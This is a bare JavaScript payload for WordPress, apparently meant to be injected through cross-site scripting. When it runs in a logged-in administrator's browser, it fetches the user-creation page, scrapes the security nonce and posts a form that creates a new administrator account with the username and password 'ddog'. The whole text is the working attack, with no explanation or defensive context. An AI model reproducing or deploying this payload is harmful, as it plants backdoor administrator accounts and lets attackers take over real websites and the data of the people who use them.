url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/user-new.php';
user = 'ddog';
pass = 'ddog';
email = 'ddog@ddog.com';

a = new XMLHttpRequest();
a.open('GET', url+p, 0);
a.send();

ss = '_wpnonce_create-user=' + /nonce_create-user" value="([^"]*?)"/.exec(a.responseText)[1] +
'&action=createuser&email='+email+'&pass1='+pass+'&pass1-text='+pass+'&pass2='+pass+'&pw_weak=on&role=administrator&user_login='+user;

b = new XMLHttpRequest();
b.open('POST', url+p, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

